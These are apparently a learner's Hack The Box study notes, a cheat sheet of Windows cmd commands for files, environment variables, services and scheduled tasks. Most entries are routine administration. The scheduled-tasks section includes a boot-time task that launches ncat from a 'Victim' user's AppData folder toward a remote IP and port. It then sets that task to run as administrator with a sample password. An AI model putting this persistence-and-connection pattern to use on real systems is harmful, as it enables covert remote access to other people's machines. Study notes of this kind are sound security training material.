#windows/cmd
# General
#### help
```cmd
help <some command>

ipconfig /?
```
#### Clear screen
```cmd
cls
```
#### History
```cmd
doskey /history
```
#### Previous commands: 
* Cycle - F5
* Interactive list - F7
```cmd.exe
:: list dirs
tree

:: List dirs and files
tree /F
```
#### Directories
```cmd
:: Create
mkdir/md

:: Remove:
rmdir/rd

:: Remove with content:
rd /S
```
#### Copy
```cmd
C:\Users\htb\Desktop> xcopy C:\Users\htb\Documents\example C:\Users\htb\Desktop\ /E

C:\Users\htb\Documents\example\file-1 - Copy.txt
C:\Users\htb\Documents\example\file-1.txt
C:\Users\htb\Documents\example\file-2.txt
C:\Users\htb\Documents\example\file-3.txt
C:\Users\htb\Documents\example\file-5.txt
C:\Users\htb\Documents\example\‎file-4.txt
6 File(s) copied
```
Utilizing the /E switch, we told Xcopy to copy any files and subdirectories to include empty directories.
If you wish to retain the file's attributes ( such as read-only or hidden ), you can use the /K switch.
#### Robocopy
```cmd
C:\Users\htb\Desktop> robocopy C:\Users\htb\Desktop C:\Users\htb\Documents\
```
#### More, fit the screen:
```cms
more /S
```
#### Pipes
```cmd
C:\Users\htb\Desktop>type passwords.txt >> secrets.txt
```
#### touch
```cmd
file createNew for-sure.txt 222
```
#### echo
```cmd
C:\Users\htb\Desktop>echo Check out this text > demo.txt
```
#### rename file
```cmd
C:\Users\htb\Desktop> ren demo.txt superdemo.txt
```
#### Pass in a Text File to a Command
```cmd
C:\Users\htb\Documents>find /i "see" < test.txt
```
#### Pipe Output Between Commands
```cmd
C:\Users\htb\Documents>ipconfig /all | find /i "IPV4"
```
#### rm
```cmd
del file

erase file1 file2
```
#### View Files With the Read-only Attribute
```cmd
C:\Users\htb\Desktop\example> dir /A:R

hidden:
C:\Users\htb\Desktop\example> dir /A:H
```
#### cp
```cmd
copy file file2
```
#### mv
```cmd
mv file file2
```
#### Find a file in PATH:
```cmd
where cmd.exe
```
#### specify path:
```cmd
where /R  c:\windows\system32 cmd.exe

where /R c:\windows\system32 *.exe
```
#### grep:
```cmd
find /N /I /V "IP Address" example.txt  
```
 /N switch to display line numbers
 /I display to ignore case sensitivity.
 /V not
#### search for a file:
```cmd
Get-ChildItem -Recurse -Filter "waldo.txt" c:\ 
```
#### diff:
```cmd
comp .\file1 .\file2
```
#### more powerfulll diff:
```cmd
fc.exe /?
```
#### sort:
```cmd
sort.exe .\file-1.md /O .\sort-1.md

sort.exe .\sort-1.md /unique
```
# env
#### scopes: 
* global
* system (machine) - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
* user - HKEY_CURRENT_USER\Environment
* process - stored in memory
```cmd
set FLAG=HTB{test}
echo %FLAG%
```
#### permanent variablw that wirtten to registry:
```
setx FLAG HTB{test}
```
#### important vars:
* %PATH%
* %OS%
* %SYSTEMROOT% - c:\windows
* %LOGONSERVER% - is machine on domain or workgroup
* %USERPROFILE% - c:\users\{username}
* %ProgramFiles% - c:\program files
* %ProgramFiles(x86)% - c:\program files (x86)
# Services
#### sc
```cmd
:: list all services
sc query type= service

:: find by name
sc query windefend 

:: start/stop
sc start Spooler
sc stop Spooler

:: disable service
sc config wuauserv start= disabled

:: revert back enable/disable
sc config wuauserv start= auto
```
#### tasklist/net/ #wmci
```cmd
:: list services
tasklist /svc

:: list started/stopped services
net start
net stop

:: paused/continued
net pause
net continue

:: list
wmic service list brief
```
# Scheduled tasks
#### Possible triggers:
* When a specific system event occurs.
* At a specific time.
* At a specific time on a daily schedule.
* At a specific time on a weekly schedule.
* At a specific time on a monthly schedule.
* At a specific time on a monthly day-of-week schedule.
* When the computer enters an idle state.
* When the task is registered.
* When the system is booted.
* When a user logs on.
* When a Terminal Server session changes state.

```cmd
:: /FO - format options: list, table, csv
:: /v - verbose
:: /s - name or host to connect
::  - /u user - set permissions as users'
::  - /p pwd 

schtasks /Query /V /FO list
```

```cmd
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
```

```cmd.exe
:: /enable
:: /disable
schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
```

```cmd
:: /F - force
schtasks /delete  /tn "My Secret Task" 
```

